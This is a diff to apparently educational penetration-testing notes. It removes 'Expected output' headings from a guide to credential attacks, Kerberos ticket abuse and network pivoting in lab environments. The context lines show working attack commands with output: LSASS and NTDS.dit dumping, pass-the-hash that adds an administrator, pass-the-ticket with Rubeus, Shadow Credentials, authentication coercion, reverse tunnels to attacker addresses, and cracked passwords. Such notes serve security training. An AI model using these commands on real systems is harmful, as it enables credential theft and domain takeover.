@@ -365,9 +365,6 @@ Hashid can be used to identify the hashcat has type
 ```bash
 hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
 ```
-
-Expected output
-
 ```bash
 # Analyzing '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
 
@@ -1500,9 +1497,6 @@ Usage
 ```bash
 evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>
 ```
-
-Expected output
-
 ```bash
 # Evil-WinRM shell v3.3
 
@@ -1982,9 +1976,6 @@ Before issuing the command to create the dump file, we must determine what proce
 ```cmd
 tasklist /svc
 ```
-
-Expected output
-
 ```cmd
 Image Name                     PID Services
 ========================= ======== ============================================
@@ -1998,9 +1989,6 @@ lsass.exe                      672 KeyIso, SamSs, VaultSvc
 ```powershell
 Get-Process lsass
 ```
-
-Expected output
-
 ```cmd
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 -------  ------    -----      -----     ------     --  -- -----------
@@ -2161,8 +2149,6 @@ whoami
 ```cmd
 cmdkey /list
 ```
-
-Expected output
 
 Currently stored credentials:
 
@@ -2355,9 +2341,6 @@ sudo mv kerbrute /usr/local/bin/
 ```bash
 kerbrute userenum --dc <DC_IP> -d exampledomain.local ~/usernames.txt
 ```
-
-Example output
-
 ```bash
 # ...
 # 2025/04/25 09:17:10 >  Using KDC(s):
@@ -2395,9 +2378,6 @@ crackmapexec smb <DC_IP> -u john -p /usr/share/wordlists/fasttrack.txt | grep "+
 ```bash
 netexec smb <DC_IP> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 ```
-
-Example output
-
 ```bash
 # SMB         <DC_IP>     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
 # SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
@@ -2436,9 +2416,6 @@ Using crackmapexec to capture NTDS.dit
 ```bash
 crackmapexec smb <DC_IP> -u <USER> -p '<PASSWORD>' --ntds drsuapi
 ```
-
-Example output
-
 ```bash
 # [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
 # SMB         <DC_IP>   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
@@ -2512,9 +2489,6 @@ We can use vssadmin to create a [Volume Shadow Copy](https://learn.microsoft.com
 ```bash
 *Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
 ```
-
-Expected output
-
 ```bash
 # vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 # (C) Copyright 2001-2013 Microsoft Corp.
@@ -2669,9 +2643,6 @@ It's a good practice to keep the latest [LaZagne executable](https://github.com/
 ```cmd
 start LaZagne.exe all
 ```
-
-Expected output
-
 ```cmd
 |====================================================================|
 |                                                                    |
@@ -2801,9 +2772,6 @@ However, if `/etc/passwd` is writable—which is a misconfiguration—an attacke
 ```bash
 head -n 1 /etc/passwd
 ```
-
-Expected output
-
 ```bash
 # root::0:0:root:/root:/bin/bash
 ```
@@ -2813,9 +2781,6 @@ This results in no password prompt being displayed when attempting to log in as 
 ```bash
 su
 ```
-
-Expected output
-
 ```bash
 # root@john[/john]#
 ```
@@ -2879,9 +2844,6 @@ The PAM library (pam_unix.so) can prevent users from reusing old passwords. Thes
 ```bash
 sudo cat /etc/security/opasswd
 ```
-
-Expected output
-
 ```bash
 # cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
 ```
@@ -2917,9 +2879,6 @@ Display the results
 ```bash
 cat /tmp/unshadowed.cracked
 ```
-
-Expected output
-
 ```bash
 # $6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:mariposa
 # $6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:Martin1
@@ -3959,9 +3918,6 @@ Import-Module .\Invoke-TheHash.psd1
 ```powershell
 Invoke-SMBExec -Target <IP> -Domain <corp.rth> -Username <USER> -Hash <NTLM_HASH> -Command "net user <NEW_USER> <NEW_PASSWORD> /add && net localgroup administrators <NEW_USER> /add" -Verbose
 ```
-
-**Expected output**
-
 ```powershell
 VERBOSE: [+] <corp.rth>\<USER> successfully authenticated on <IP>
 VERBOSE: <corp.rth>\<USER> has Service Control Manager write privilege on <IP>
@@ -4222,9 +4178,6 @@ mimikatz # exit
 ```cmd
 dir *.kirbi
 ```
-
-**Expected output**
-
 ```cmd
 Directory: c:\Users\Public
 
@@ -4382,9 +4335,6 @@ After executing an OverPass‑the‑Hash attack, you may obtain the resulting ti
 ```cmd
 Rubeus.exe asktgt /domain:<corp.rth> /user:<USER> /rc4:<HASH> /ptt
 ```
-
-Expected output
-
 ```cmd
    ______        _
   (_____ \      | |
@@ -4431,9 +4381,6 @@ Another way is to import the ticket into the current session using the .kirbi fi
 ```cmd
 Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi
 ```
-
-**Expected output:**
-
 ```cmd
  ______        _
 (_____ \      | |
@@ -4454,9 +4401,6 @@ v1.5.0
 ```cmd
 dir \\DC01.<corp.rth>\c$
 ```
-
-**Expected output:**
-
 ```cmd
 Directory: \\dc01.<corp.rth>\c$
 
@@ -4479,9 +4423,6 @@ We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to p
 ```powershell
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"))
 ```
-
-**Expected output:**
-
 ```cmd
 <BASE64_TICKET>
 ```
@@ -4491,9 +4432,6 @@ We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to p
 ```cmd
 Rubeus.exe ptt /ticket:<BASE64_TICKET>
 ```
-
-**Expected output:**
-
 ```cmd
  ______        _
 (_____ \      | |
@@ -4514,9 +4452,6 @@ v1.5.0
 ```cmd
 dir \\DC01.<corp.rth>\c$
 ```
-
-**Expected output:**
-
 ```cmd
 Directory: \\dc01.<corp.rth>\c$
 
@@ -4553,9 +4488,6 @@ mimikatz # exit
 ```cmd
 dir \\DC01.<corp.rth>\c$
 ```
-
-**Expected output:**
-
 ```cmd
 Directory: \\dc01.<corp.rth>\c$
 
@@ -4622,9 +4554,6 @@ Enter-PSSession -ComputerName DC01
 ```powershell
 whoami
 ```
-
-**Expected output**
-
 ```powershell
 <corp.rth>\<USER>
 ```
@@ -4643,9 +4572,6 @@ Rubeus has the option `createnetonly`, which creates a sacrificial process/logon
 ```cmd
 Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 ```
-
-**Expected output**
-
 ```cmd
    ______        _
   (_____ \      | |
@@ -4681,9 +4607,6 @@ The above command will open a new cmd window. From that window, we can execute R
 ```cmd
 Rubeus.exe asktgt /user:<USER> /domain:<corp.rth> /aes256:<AES_KEY> /ptt
 ```
-
-**Expected output**
-
 ```powershell
    ______        _
   (_____ \      | |
@@ -4734,9 +4657,6 @@ Enter-PSSession -ComputerName DC01
 ```powershell
 whoami
 ```
-
-**Expected output**
-
 ```powershell
 <corp.rth>\<USER>
 ```
@@ -4784,9 +4704,6 @@ The [realm](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/
 ```bash
 realm list
 ```
-
-**Expected output:**
-
 ```bash
 # <corp.rth>
 #   type: kerberos
@@ -4841,9 +4758,6 @@ realm list
 ```bash
 ps -ef | grep -i "winbind\|sssd"
 ```
-
-**Expected output:**
-
 ```bash
 # root         847       1  0 15:33 ?        00:00:00 /usr/sbin/sssd -i --logger=files
 # root         997     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_be --domain <corp.rth> --uid 0 --gid 0 --logger=files
@@ -4890,9 +4804,6 @@ On Linux domain-joined machines, we want to find Kerberos tickets to gain more a
 ```bash
 find / -name *keytab* -ls 2>/dev/null
 ```
-
-**Expected output:**
-
 ```bash
 # 131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
 # 262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
@@ -4908,9 +4819,6 @@ find / -name *keytab* -ls 2>/dev/null
 ```bash
 crontab -l
 ```
-
-**Expected output:**
-
 ```bash
 # m h  dom mon dow   command
 # *5/ * * * * /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
@@ -4921,9 +4829,6 @@ crontab -l
 ```bash
 cat /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
 ```
-
-**Expected output:**
-
 ```bash
 #!/bin/bash
 
@@ -4944,9 +4849,6 @@ cat /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
 ```bash
 env | grep -i krb5
 ```
-
-**Expected output:**
-
 ```bash
 # KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
 ```
@@ -4963,9 +4865,6 @@ Ccache files are located, by default, at `/tmp`.
 ```bash
 ls -la /tmp
 ```
-
-**Expected output:**
-
 ```bash
 # total 68
 # drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
@@ -5017,9 +4916,6 @@ A keytab file lists one or more Kerberos principals along with their encrypted s
 ```bash
 klist
 ```
-
-**Expected Output:**
-
 ```bash
 # Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
 # Default principal: david@<corp.rth>
@@ -5044,9 +4940,6 @@ kinit carlos@<CORP.RTH> -k -t /opt/specialfiles/carlos.keytab
 ```bash
 klist
 ```
-
-**Expected Output:**
-
 ```bash
 # Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
 # Default principal: carlos@<CORP.RTH>
@@ -5064,9 +4957,6 @@ klist
 ```bash
 smbclient //dc01/carlos -k -c ls
 ```
-
-**Expected Output:**
-
 ```bash
 #   .                                   D        0  Thu Oct  6 14:46:26 2022
 #   ..                                  D        0  Thu Oct  6 14:46:26 2022
@@ -5094,9 +4984,6 @@ We can use KeyTabExtract—a Python script—to extract data from version 0x502 
 ```bash
 python3 ./keytabextract.py /opt/specialfiles/carlos.keytab 
 ```
-
-**Expected Output:**
-
 ```bash
 # [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
 # [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
@@ -5173,9 +5060,6 @@ As root, we need to identify which tickets are present on the machine, to whom t
 ```bash
 ls -la /tmp
 ```
-
-**Expected Output:**
-
 ```bash
 # total 76
 # drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
@@ -5197,9 +5081,6 @@ If there is an user to whom we have not yet gained access. We can confirm the gr
 ```bash
 id julio@<corp.rth>
 ```
-
-**Expected Output:**
-
 ```bash
 # uid=647401106(julio@<corp.rth>) gid=647400513(domain users@<corp.rth>) groups=647400513(domain users@<corp.rth>),647400512(domain admins@<corp.rth>),647400572(denied rodc password replication group@<corp.rth>)
 ```
@@ -5220,9 +5101,6 @@ export KRB5CCNAME=$(pwd)/krb5cc_647401106_HRJDux
 ```bash
 klist
 ```
-
-**Expected Output:**
-
 ```bash
 # Ticket cache: FILE:/root/krb5cc_647401106_I8I133
 # Default principal: julio@<CORP.RTH>
@@ -5239,9 +5117,6 @@ klist
 ```bash
 smbclient //dc01/C$ -k -c ls -no-pass
 ```
-
-**Expected Output:**
-
 ```bash
 #   $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2024
 #   Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2024
@@ -5291,9 +5166,6 @@ echo "<MS01_IP> ms01.<corp.rth> ms01" | sudo tee -a /etc/hosts
 ```bash
 cat /etc/hosts
 ```
-
-**Expected Output**
-
 ```bash
 # Host addresses
 
@@ -5312,9 +5184,6 @@ sudo sed -i '/^\[ProxyList\]/,$c\[ProxyList]\nsocks5 127.0.0.1 1080' /etc/proxyc
 ```bash
 cat /etc/proxychains.conf
 ```
-
-**Expected Output**
-
 ```bash
 # [ProxyList]
 # socks5 127.0.0.1 1080
@@ -5330,9 +5199,6 @@ gzip -d chisel_1.7.7_linux_amd64.gz
 mv chisel_* chisel && chmod +x ./chisel
 sudo ./chisel server --reverse 
 ```
-
-**Expected Output**
-
 ```bash
 # 2025/10/10 07:26:15 server: Reverse tunneling enabled
 # 2025/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
@@ -5354,9 +5220,6 @@ xfreerdp /v:<IP> /u:<USER> /d:<corp.rth> /p:<PASSWORD> /dynamic-resolution
 ```cmd
 c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 ```
-
-**Expected Output**
-
 ```cmd
 2025/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
 2025/10/10 06:34:20 client: Connected (Latency 125.6177ms)
@@ -5384,9 +5247,6 @@ To use the Kerberos ticket, we need to specify our target machine name (not the 
 ```bash
 proxychains impacket-wmiexec dc01 -k
 ```
-
-**Expected Output**
-
 ```bash
 # [proxychains] config file found: /etc/proxychains.conf
 # [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -5409,9 +5269,6 @@ proxychains impacket-wmiexec dc01 -k
 ```cmd
 whoami
 ```
-
-**Expected Output**
-
 ```cmd
 <corp.rth>\julio
 ```
@@ -5455,9 +5312,6 @@ In case the package krb5-user is already installed, we need to change the config
 ```bash
 proxychains evil-winrm -i dc01 -r <corp.rth>
 ```
-
-**Expected Output**
-
 ```bash
 # [proxychains] config file found: /etc/proxychains.conf
 # [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -5473,9 +5327,6 @@ proxychains evil-winrm -i dc01 -r <corp.rth>
 ```powershell
 *Evil-WinRM* PS C:\Users\julio\Documents> whoami
 ```
-
-**Expected Output**
-
 ```powershell
 <corp.rth>\julio
 ```
@@ -5485,9 +5336,6 @@ proxychains evil-winrm -i dc01 -r <corp.rth>
 ```powershell
 *Evil-WinRM* PS C:\Users\julio\Documents> hostname
 ```
-
-**Expected Output**
-
 ```powershell
 DC01
 ```
@@ -5506,9 +5354,6 @@ If we want to use a ccache file in Windows or a kirbi file in a Linux machine, w
 ```bash
 impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 ```
-
-**Expected Output:**
-
 ```bash
 # Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -5526,9 +5371,6 @@ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 ```cmd
 C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 ```
-
-**Expected Output**
-
 ```bash
 #    ______        _
 #   (_____ \      | |
@@ -5549,9 +5391,6 @@ C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 ```cmd
 klist
 ```
-
-**Expected Output**
-
 ```bash
 # Current LogonId is 0:0x31adf02
 
@@ -5575,9 +5414,6 @@ klist
 ```cmd
 dir \\dc01\julio
 ```
-
-**Expected Output**
-
 ```bash
 #  Volume in drive \\dc01\julio has no label.
 #  Volume Serial Number is B8B3-0D72
@@ -5732,9 +5568,6 @@ Attackers can either wait for victims to attempt authentication against their ma
 ```bash
 python3 printerbug.py <CORP.LOCAL>/<USER>:"<USER>"@<DC01_IP> <ATTACKER_IP>
 ```
-
-**Expected output**
-
 ```bash
 # [*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -5800,9 +5633,6 @@ pip3 install -I git+https://github.com/wbond/oscrypto.git
 ```bash
 python3 gettgtpkinit.py -cert-pfx ../'DC01$.pfx' -dc-ip <DC01_IP> '<corp.local>/dc01$' /tmp/dc.ccache
 ```
-
-**Expected Output**
-
 ```bash
 # 2025-08-04 11:19:37,153 minikerberos INFO     Loading certificate and key from file
 # INFO:minikerberos:Loading certificate and key from file
@@ -5825,9 +5655,6 @@ export KRB5CCNAME=/tmp/dc.ccache
 echo "<DC01_IP> DC01.<CORP>.LOCAL" | sudo tee -a /etc/hosts
 impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<CORP>.LOCAL/DC01$'@DC01.<CORP>.LOCAL
 ```
-
-**Expected Output**
-
 ```bash
 # Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -5846,9 +5673,6 @@ impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<
 ```bash
 impacket-psexec -hashes :fd02e525dd676fd8ca04e200d265f20c 'administrator@'<DC01_IP>
 ```
-
-**Expected Output**
-
 ```bash
 # Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -5942,9 +5766,6 @@ This generates a certificate and adds a new key credential to the victim user's 
 ```bash
 pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u <USER> -p '<PASSWORD>' --target <TARGET_USER> --action add
 ```
-
-**Expected Output**
-
 ```bash
 # [*] Searching for the target account
 # [*] Target user found: CN=<FULL NAME>,CN=Users,DC=<corp>,DC=local
@@ -5969,9 +5790,6 @@ pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u <USER> -p '<PASSWORD>' --target <
 ```bash
 python3 gettgtpkinit.py -cert-pfx <FILENAME>.pfx -pfx-pass '<PFX_PASS>' -dc-ip <DC01_IP> <CORP>.LOCAL/<TARGET_USER> /tmp/<TARGET_USER>.ccache
 ```
-
-**Expected Output**
-
 ```bash
 # 2025-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
 # INFO:minikerberos:Loading certificate and key from file
@@ -5991,9 +5809,6 @@ python3 gettgtpkinit.py -cert-pfx <FILENAME>.pfx -pfx-pass '<PFX_PASS>' -dc-ip <
 export KRB5CCNAME=/tmp/<TARGET_USER>.ccache
 klist
 ```
-
-**Expected Output**
-
 ```bash
 # Ticket cache: FILE:/tmp/<TARGET_USER>.ccache
 # Default principal: <TARGET_USER>@<CORP>.LOCAL
@@ -6009,9 +5824,6 @@ In this case, we discovered that the victim user is a member of the **Remote Man
 ```bash
 evil-winrm -i dc01.<corp>.local -r <corp>.local
 ```
-
-**Expected Output:**
-
 ```bash
 # Evil-WinRM shell v3.7
 # Info: Establishing connection to remote endpoint
@@ -6295,9 +6107,6 @@ echo "Betty Jayde" > ~/name.txt
 ```bash
 cat ~/name.txt
 ```
-
-**Expected Output**
-
 ```bash
 # Betty Jayde
 ```
@@ -6321,9 +6130,6 @@ chmod +x username-anarchy
 ```bash
 cat ~/usernames.txt
 ```
-
-**Expected Output**
-
 ```bash
 # betty
 # bettyjayde
@@ -6391,9 +6197,6 @@ ssh -D 1080 jbetty@10.129.234.116
 ```bash
 history
 ```
-
-**Example output**
-
 ```bash
 # ...
 # 24  htop
@@ -6412,9 +6215,6 @@ history
 ```bash
 proxychains smbclient -L //172.16.119.10 -U NEXURA/hwilliam
 ```
-
-**Expected output**
-
 ```bash
 # [proxychains] config file found: /etc/proxychains.conf
 # [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -6440,9 +6240,6 @@ proxychains smbclient -L //172.16.119.10 -U NEXURA/hwilliam
 ```bash
 proxychains smbget -R smb://172.16.119.10/HR -U NEXURA/hwilliam
 ```
-
-**Example Output**
-
 ```bash
 # [proxychains] config file found: /etc/proxychains.conf
 # [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -6493,9 +6290,6 @@ pwsafe2john Employee-Passwords_OLD.psafe3 > psafe.hash
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
 ```
-
-**Expected Output**
-
 ```bash
 # Created directory: /home/htb-ac-1640397/.john
 # Using default input encoding: UTF-8
@@ -6563,9 +6357,6 @@ chmod +x proxy
 ```bash
 sudo ./proxy -selfcert
 ```
-
-**Expected output**
-
 ```bash
 #     __    _             __                       
 #    / /   (_)___ _____  / /___        ____  ____ _
@@ -6611,9 +6402,6 @@ chmod +x agent
 ```bash
 ./agent -connect 10.10.14.194:11601 -ignore-cert
 ```
-
-**(DMZ01) Expected output**
-
 ```bash
 # WARN[0000] warning, certificate validation disabled     
 # INFO[0000] Connection established                        addr="10.10.14.194:11601"
@@ -6714,9 +6502,6 @@ sudo ip route add 172.16.119.0/24 dev ligolo
 ```bash
 sudo ip route add 172.16.119.0/24 dev ligolo
 ```
-
-**Expected Output**
-
 ```bash
 # ...
 # 172.16.119.0/24 dev ligolo scope link
@@ -6745,9 +6530,6 @@ sudo ip route add 172.16.119.0/24 dev ligolo
 ```bash
 ping 172.16.119.11
 ```
-
-**Expected Output**
-
 ```bash
 # PING 172.16.119.11 (172.16.119.11) 56(84) bytes of data.
 # 64 bytes from 172.16.119.11: icmp_seq=1 ttl=64 time=69.8 ms
@@ -6803,9 +6585,6 @@ cat domain_passwords.txt
 ```bash
 crackmapexec smb 172.16.119.11 -u domain_usernames.txt -p domain_passwords.txt --groups 'Domain Admins' --continue-on-success
 ```
-
-**Expected Output:**
-
 ```bash
 # SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
 # ...
@@ -6858,9 +6637,6 @@ proxychains evil-winrm -i 172.16.119.7 -u 'bdavid' -p 'caramel-cigars-reply1'
 ```bash
 *Evil-WinRM* PS C:\Users\bdavid\Documents> upload mimikatz.exe mimikatz.exe
 ```
-
-**Expected Output:**
-
 ```bash
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
@@ -6881,9 +6657,6 @@ proxychains evil-winrm -i 172.16.119.7 -u 'bdavid' -p 'caramel-cigars-reply1'
 ```bash
 *Evil-WinRM* PS C:\Users\bdavid> download mimikatz_output.txt mimikatz_output.txt
 ```
-
-**Expected Output:**
-
 ```bash
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
@@ -6904,9 +6677,6 @@ proxychains evil-winrm -i 172.16.119.7 -u 'bdavid' -p 'caramel-cigars-reply1'
 ```bash
 cat mimikatz_output.txt
 ```
-
-**Expected Output:**
-
 ```bash
 # ...
 
@@ -6981,12 +6751,9 @@ impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1@172.16.119.11'
 ```bash
 crackmapexec smb 172.16.119.11 -u Administrator -H <ADMINISTRATOR_NTLM_HASH>
 ```
-
-**Expected Output:**
-
 ```bash
-SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
-SMB         172.16.119.11   445    DC01             [+] nexura.htb\Administrator:<ADMINISTRATOR_NTLM_HASH> (Pwn3d!)
+# SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
+# SMB         172.16.119.11   445    DC01             [+] nexura.htb\Administrator:<ADMINISTRATOR_NTLM_HASH> (Pwn3d!)
 ```
 
 **Next Steps:**
